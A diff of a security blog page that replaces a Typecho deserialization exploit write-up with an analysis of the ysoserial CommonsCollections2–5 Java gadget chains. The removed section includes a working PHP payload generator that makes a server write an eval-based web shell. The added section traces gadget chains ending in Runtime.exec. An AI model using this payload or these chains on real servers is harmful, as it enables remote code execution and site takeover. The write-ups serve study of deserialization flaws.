@@ -84,23 +84,17 @@ border-left-color: #A349A4; /*左边框颜色*/
 
 
 
-<meta name="description" content="typecho反序列化漏洞复现0X00 前言Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。 0X01. 漏洞版本V1.1-15.5.12-beta以前 0X02 漏洞分析反序列化可控点：install.php 229~235行该博客程序判断是否安装的代码如下12345678910111213141516171819//判断是否已经安装if (!i">
+<meta name="description" content="CommonsCollections2分析：CommonsCollections2和和CommonsBeanutils1一样也使用了比较器去触发TemplatesImpl的newTransformer方法执行命令。这里用到的比较器为TransformingComparator，主要利用了其compare方法：123456public int compare(Object obj1, Object">
 <meta name="keywords">
 <meta property="og:type" content="article">
-<meta property="og:title" content="typecho反序列化漏洞复现">
-<meta property="og:url" content="http://www.tharavel.site/2017/10/29/typecho-deserialization.html">
+<meta property="og:title" content="ysoserial源码分析(3)">
+<meta property="og:url" content="http://www.tharavel.site/2018/05/01/ysoserial-analysis3.html">
 <meta property="og:site_name" content="tharavel's blog">
-<meta property="og:description" content="typecho反序列化漏洞复现0X00 前言Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。 0X01. 漏洞版本V1.1-15.5.12-beta以前 0X02 漏洞分析反序列化可控点：install.php 229~235行该博客程序判断是否安装的代码如下12345678910111213141516171819//判断是否已经安装if (!i">
-<meta property="og:image" content="http://op5cjcnmi.bkt.clouddn.com/1.PNG">
-<meta property="og:image" content="http://op5cjcnmi.bkt.clouddn.com/2.PNG">
-<meta property="og:image" content="http://op5cjcnmi.bkt.clouddn.com/3.PNG">
-<meta property="og:image" content="http://op5cjcnmi.bkt.clouddn.com/4.PNG">
-<meta property="og:image" content="http://op5cjcnmi.bkt.clouddn.com/5.PNG">
-<meta property="og:updated_time" content="2017-11-17T07:26:30.482Z">
+<meta property="og:description" content="CommonsCollections2分析：CommonsCollections2和和CommonsBeanutils1一样也使用了比较器去触发TemplatesImpl的newTransformer方法执行命令。这里用到的比较器为TransformingComparator，主要利用了其compare方法：123456public int compare(Object obj1, Object">
+<meta property="og:updated_time" content="2018-05-01T17:16:55.135Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="typecho反序列化漏洞复现">
-<meta name="twitter:description" content="typecho反序列化漏洞复现0X00 前言Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。 0X01. 漏洞版本V1.1-15.5.12-beta以前 0X02 漏洞分析反序列化可控点：install.php 229~235行该博客程序判断是否安装的代码如下12345678910111213141516171819//判断是否已经安装if (!i">
-<meta name="twitter:image" content="http://op5cjcnmi.bkt.clouddn.com/1.PNG">
+<meta name="twitter:title" content="ysoserial源码分析(3)">
+<meta name="twitter:description" content="CommonsCollections2分析：CommonsCollections2和和CommonsBeanutils1一样也使用了比较器去触发TemplatesImpl的newTransformer方法执行命令。这里用到的比较器为TransformingComparator，主要利用了其compare方法：123456public int compare(Object obj1, Object">
 
 
 
@@ -128,13 +122,13 @@ border-left-color: #A349A4; /*左边框颜色*/
 
 
 
-  <link rel="canonical" href="http://www.tharavel.site/2017/10/29/typecho-deserialization.html"/>
+  <link rel="canonical" href="http://www.tharavel.site/2018/05/01/ysoserial-analysis3.html"/>
 
 
 
 
 
-  <title>typecho反序列化漏洞复现 | tharavel's blog</title>
+  <title>ysoserial源码分析(3) | tharavel's blog</title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -307,7 +301,7 @@ border-left-color: #A349A4; /*左边框颜色*/
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://www.tharavel.site/2017/10/29/typecho-deserialization.html">
+    <link itemprop="mainEntityOfPage" href="http://www.tharavel.site/2018/05/01/ysoserial-analysis3.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="tharavel">
@@ -328,7 +322,7 @@ border-left-color: #A349A4; /*左边框颜色*/
             
             
               
-                typecho反序列化漏洞复现
+                ysoserial源码分析(3)
               
             
           </h2>
@@ -343,8 +337,8 @@ border-left-color: #A349A4; /*左边框颜色*/
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-29T22:51:04+08:00">
-                2017-10-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-01T11:57:23+08:00">
+                2018-05-01
               </time>
             
 
@@ -362,7 +356,7 @@ border-left-color: #A349A4; /*左边框颜色*/
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a class="cloud-tie-join-count" href="/2017/10/29/typecho-deserialization.html#comments" itemprop="discussionUrl">
+                <a class="cloud-tie-join-count" href="/2018/05/01/ysoserial-analysis3.html#comments" itemprop="discussionUrl">
                   <span class="post-comments-count join-count" itemprop="commentCount"></span>
                 </a>
               </span>
@@ -388,17 +382,24 @@ border-left-color: #A349A4; /*左边框颜色*/
       
 
       
-        <h2 id="typecho反序列化漏洞复现"><a href="#typecho反序列化漏洞复现" class="headerlink" title="typecho反序列化漏洞复现"></a>typecho反序列化漏洞复现</h2><h3 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h3><p>Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。</p>
-<h3 id="0X01-漏洞版本"><a href="#0X01-漏洞版本" class="headerlink" title="0X01. 漏洞版本"></a>0X01. 漏洞版本</h3><p>V1.1-15.5.12-beta以前</p>
-<h3 id="0X02-漏洞分析"><a href="#0X02-漏洞分析" class="headerlink" title="0X02 漏洞分析"></a>0X02 漏洞分析</h3><p>反序列化可控点：install.php 229~235行<br><img src="http://op5cjcnmi.bkt.clouddn.com/1.PNG" alt="此处输入图片的描述"><br>该博客程序判断是否安装的代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//判断是否已经安装</span></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'finish'</span>]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . <span class="string">'/config.inc.php'</span>) &amp;&amp; <span class="keyword">empty</span>($_SESSION[<span class="string">'typecho'</span>])) &#123;</div><div class="line">    <span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 挡掉可能的跨站请求</span></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET) || !<span class="keyword">empty</span>($_POST)) &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>])) &#123;</div><div class="line">        <span class="keyword">exit</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $parts = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</div><div class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($parts[<span class="string">'port'</span>])) &#123;</div><div class="line">        $parts[<span class="string">'host'</span>] = <span class="string">"&#123;$parts['host']&#125;:&#123;$parts['port']&#125;"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $_SERVER[<span class="string">'HTTP_HOST'</span>] != $parts[<span class="string">'host'</span>]) &#123;</div><div class="line">        <span class="keyword">exit</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>这里的判断逻辑有点滑稽，参数中含有finish并且Referer是内网即可进入install.php。。。既然能进入install.php,那么现在先决条件已具备，接着分析。</p>
-<p>这里有一个反序列化操作，而参数从cookie获取，可控。   想到构造POP链。既然是序列化，免不了利用对象，于是跟进Typecho_Db对象<br><img src="http://op5cjcnmi.bkt.clouddn.com/2.PNG" alt="此处输入图片的描述"><br>看到这里对传入的参数\$adapterName进行了字符串拼接操作，如果$adapterName是一个实例化对象，就会触发__tostring魔法方法，全局搜索发现__tostring方法出现在以下三个类中：</p>
-<blockquote>
-<p>Typecho_Feed<br>Typecho_Config<br>Typecho_Db_Query</p>
-</blockquote>
-<p>分别跟进后发现只有Typecho_Feed类可利用，可利用地点如下：<br><img src="http://op5cjcnmi.bkt.clouddn.com/3.PNG" alt="此处输入图片的描述"><br>在290行，如果screenName是不可访问变量，便会调用__get()魔法方法，搜索__get()方法，有好几处，分析后发现在Typecho_Request类中可以利用。在该类中__get方法调用了get方法，而在get方法中又调用了_applyFilter方法<br><img src="http://op5cjcnmi.bkt.clouddn.com/4.PNG" alt="此处输入图片的描述"></p>
-<p>跟进该方法<br><img src="http://op5cjcnmi.bkt.clouddn.com/5.PNG" alt="此处输入图片的描述"><br>醒目的array_map函数和call_user_func函数。。。<br>至此POP链已经构造完成。</p>
-<h3 id="0X03-Payload"><a href="#0X03-Payload" class="headerlink" title="0X03 Payload"></a>0X03 Payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</div><div class="line">	<span class="keyword">private</span> $_type = <span class="string">'RSS 2.0'</span>;</div><div class="line">	<span class="keyword">private</span> $_items;</div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;_items[] = <span class="keyword">array</span>(<span class="string">'author'</span>=&gt;$a);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</div><div class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>(<span class="string">'screenName'</span>=&gt;<span class="string">'file_put_contents('</span>shell.php<span class="string">', '</span><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[tharavel]);<span class="meta">?&gt;</span><span class="string">')'</span>);</div><div class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>(<span class="string">'assert'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$payload1 = <span class="keyword">new</span> Typecho_Request();</div><div class="line">$payload2 = <span class="keyword">new</span> Typecho_Feed($payload1);</div><div class="line">$exp = <span class="keyword">array</span>(<span class="string">'adapter'</span> =&gt; $payload2, <span class="string">'prefix'</span> =&gt; <span class="string">'typecho'</span>);</div><div class="line"></div><div class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</div></pre></td></tr></table></figure>
+        <h3 id="CommonsCollections2分析："><a href="#CommonsCollections2分析：" class="headerlink" title="CommonsCollections2分析："></a>CommonsCollections2分析：</h3><p>CommonsCollections2和和CommonsBeanutils1一样也使用了比较器去触发TemplatesImpl的newTransformer方法执行命令。这里用到的比较器为TransformingComparator，主要利用了其compare方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Object obj1, Object obj2)</span></span></div><div class="line">&#123;</div><div class="line">    Object value1 = transformer.transform(obj1);</div><div class="line">    Object value2 = transformer.transform(obj2);</div><div class="line">    <span class="keyword">return</span> decorated.compare(value1, value2);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>我们先看一步步看源码，首先是构造templates对象，这个以前分析过，就不再说了，可以翻找前面的文章。然后实例化了一个InvokerTransformer对象，CommonsCollections4.0中InvokerTransformer构造函数稍有一点变化，代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class paramTypes[], Object args[])</span></span></div><div class="line">&#123;</div><div class="line">    iMethodName = methodName;</div><div class="line">    iParamTypes = paramTypes == <span class="keyword">null</span> ? <span class="keyword">null</span> : (Class[])paramTypes.clone();</div><div class="line">    iArgs = args == <span class="keyword">null</span> ? <span class="keyword">null</span> : (Object[])((Object []) (args)).clone();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>接着就是将templates对象放进PriorityQueue类里，将transformer对象的iMethodName属性修改为newTransformer，这里再次强调一下，要使用反射修改变量，而不是直接赋值，不然会在生成payload时就执行命令，从而导致无法生成序列化数据。最后返回PriorityQueue对象queue。</p>
+<p>反序列化过程调用链如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">ObjectInputStream.readObject</div><div class="line">    PriorityQueue.readObject</div><div class="line">        PriorityQueue.heapify</div><div class="line">            PriorityQueue.siftDown</div><div class="line">                PriorityQueue.siftDownUsingComparator</div><div class="line">                    TransformingComparator.compare</div><div class="line">                        InvokerTransformer.transform()</div><div class="line">                            Method.invoke(templates,iArgs) //这里Method是之前反射修改成的newTransformer,所以这里相当于执行TemplatesImpl.newTransformer</div><div class="line">                                TemplatesImpl.getTransletInstance</div><div class="line">                                   TemplatesImpl.defineTransletClasses</div><div class="line">                                        TemplatesImpl.TransletClassLoader.defineClass</div><div class="line">                                        Class.newInstance()</div><div class="line">                                            Runtime.exec()</div></pre></td></tr></table></figure></p>
+<h3 id="CommonsCollections3分析："><a href="#CommonsCollections3分析：" class="headerlink" title="CommonsCollections3分析："></a>CommonsCollections3分析：</h3><p>CommonsCollections3适用于commons-collections:3.1，CommonsCollections3与CommonsCollections1差不多，ConstantTransformer的构造略有不同。</p>
+<p>这次用的是InstantiateTransformer类，而不再是InvokerTransformer类，InvokerTransformer类主要方法如下,其transform方法会对传入的class进行实例化<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> </span>&#123;</div><div class="line">    <span class="keyword">super</span>();</div><div class="line">    iParamTypes = paramTypes;</div><div class="line">    iArgs = args;</div><div class="line">&#125;</div><div class="line"></div><div class="line">......</div><div class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="keyword">false</span>) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(</div><div class="line">                <span class="string">"InstantiateTransformer: Input object was not an instanceof Class, it was a "</span></div><div class="line">                    + (input == <span class="keyword">null</span> ? <span class="string">"null object"</span> : input.getClass().getName()));</div><div class="line">        &#125;</div><div class="line">        Constructor con = ((Class) input).getConstructor(iParamTypes);</div><div class="line">        <span class="keyword">return</span> con.newInstance(iArgs);</div><div class="line">    &#125;</div><div class="line">    ......</div></pre></td></tr></table></figure></p>
+<p>还用到了一个TrAXFilter类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span></span></div><div class="line">    <span class="keyword">throws</span> TransformerConfigurationException</div><div class="line">&#123;</div><div class="line">    _templates = templates;</div><div class="line">    _transformer = (TransformerImpl)templates.newTransformer();</div><div class="line">    _transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(_transformer);</div><div class="line">    _overrideDefaultParser = _transformer.overrideDefaultParser();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>看到其中的<code>templates.newTransformer()</code>估计应该能想到整个调用方式了。</p>
+<p>我们直接看反序列化调用链，LazyMap.get()方法执行后触发ChainedTransformer链，执行<code>TrAXFilter.class.getConstructor(Templates.class).newInstance(templatesImpl)</code>，也即是<code>new TrAXFilter(templatesImpl)</code>,然后触发templates.newTransformer()从而引起了命令执行。</p>
+<h3 id="CommonsCollections4分析："><a href="#CommonsCollections4分析：" class="headerlink" title="CommonsCollections4分析："></a>CommonsCollections4分析：</h3><p>commons-collections4以上的版本中已经没有Lazymap.decorate方法，所以使用了别的办法触发transformerChain链。</p>
+<p>用到的类基本都是之前payload中用过的，所以下面就简单分析一下。</p>
+<p>首先还是构造一个 templates对象，构造的ChainedTransformer链包含ConstantTransformer对象和InstantiateTransformer对象，后面通过反射修改ConstantTransformer的iConstant值为TrAXFilter.class，把InstantiateTransformer的paramTypes, args分别赋值为Templates.class和templates。在反序列化过程中通过PriorityQueue类触发<code>TransformingComparator.compare</code>，然后触发ChainedTransformer.transform执行<code>TrAXFilter.class.getConstructor(Templates.class).newInstance(templatesImpl)</code>从而导致命令执行</p>
+<h3 id="CommonsCollections5分析："><a href="#CommonsCollections5分析：" class="headerlink" title="CommonsCollections5分析："></a>CommonsCollections5分析：</h3><p>CommonsCollections5也是适用于3.1版本，利用方式和CommonsCollections1差不多，用到了两个新类TiedMapEntry和BadAttributeValueExpException。</p>
+<p>前面都一样，先构造ConstantTransformer链，然后产生lazymap对象，所以的目标还是要触发lazymap的get方法。</p>
+<p>重点看一下下面的代码，把生成的lazymap对象传给TiedMapEntry类，看看这个类的关键方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">TiedMapEntry</span><span class="params">(Map map, Object key)</span> </span>&#123;</div><div class="line">    <span class="keyword">super</span>();</div><div class="line">    <span class="keyword">this</span>.map = map;</div><div class="line">    <span class="keyword">this</span>.key = key;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>可以看到lazymap被赋值给map。接着又实例化了BadAttributeValueExpException对象val，并通过反射机制把val对象的val属性修改为TiedMapEntry类的对象enrty，最后返回val对象。</p>
+<p>BadAttributeValueExpException关键函数如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">BadAttributeValueExpException</span><span class="params">(Object obj)</span></span></div><div class="line">&#123;</div><div class="line">    val = obj != <span class="keyword">null</span> ? ((Object) (obj.toString())) : <span class="keyword">null</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream objectinputstream)</span></span></div><div class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</div><div class="line">&#123;</div><div class="line">    java.io.ObjectInputStream.GetField getfield = objectinputstream.readFields();</div><div class="line">    Object obj = getfield.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</div><div class="line">    <span class="keyword">if</span>(obj == <span class="keyword">null</span>)</div><div class="line">        val = <span class="keyword">null</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    <span class="keyword">if</span>(obj <span class="keyword">instanceof</span> String)</div><div class="line">        val = obj;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    <span class="keyword">if</span>(System.getSecurityManager() == <span class="keyword">null</span> || (obj <span class="keyword">instanceof</span> Long) || (obj <span class="keyword">instanceof</span> Integer) || (obj <span class="keyword">instanceof</span> Float) || (obj <span class="keyword">instanceof</span> Double) || (obj <span class="keyword">instanceof</span> Byte) || (obj <span class="keyword">instanceof</span> Short) || (obj <span class="keyword">instanceof</span> Boolean))</div><div class="line">        val = obj.toString(); <span class="comment">//执行entry.toSrting</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">        val = (<span class="keyword">new</span> StringBuilder()).append(System.identityHashCode(obj)).append(<span class="string">"@"</span>).append(obj.getClass().getName()).toString();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> map.get(key);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> getKey() + <span class="string">"="</span> + getValue();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>我们分析一下反序列化调用链：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">BadAttributeValueExpException.readObject()</div><div class="line">    TiedMapEntry.toSrting() //这里是entry对象</div><div class="line">        TiedMapEntry.getValue()</div><div class="line">            LazyMap.get()</div><div class="line">            ......</div><div class="line">            Runtime.exec()</div></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -445,15 +446,15 @@ border-left-color: #A349A4; /*左边框颜色*/
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/03/23/command-execute.html" rel="next" title="各种命令执行总结">
-                <i class="fa fa-chevron-left"></i> 各种命令执行总结
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/04/29/ysoserial-analysis2.html" rel="prev" title="ysoserial源码分析(2)">
+                ysoserial源码分析(2) <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -595,7 +596,7 @@ border-left-color: #A349A4; /*左边框颜色*/
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#typecho反序列化漏洞复现"><span class="nav-number">1.</span> <span class="nav-text">typecho反序列化漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0X00-前言"><span class="nav-number">1.1.</span> <span class="nav-text">0X00 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X01-漏洞版本"><span class="nav-number">1.2.</span> <span class="nav-text">0X01. 漏洞版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X02-漏洞分析"><span class="nav-number">1.3.</span> <span class="nav-text">0X02 漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X03-Payload"><span class="nav-number">1.4.</span> <span class="nav-text">0X03 Payload</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#CommonsCollections2分析："><span class="nav-number">1.</span> <span class="nav-text">CommonsCollections2分析：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CommonsCollections3分析："><span class="nav-number">2.</span> <span class="nav-text">CommonsCollections3分析：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CommonsCollections4分析："><span class="nav-number">3.</span> <span class="nav-text">CommonsCollections4分析：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CommonsCollections5分析："><span class="nav-number">4.</span> <span class="nav-text">CommonsCollections5分析：</span></a></li></ol></div>
             
 
           </div>
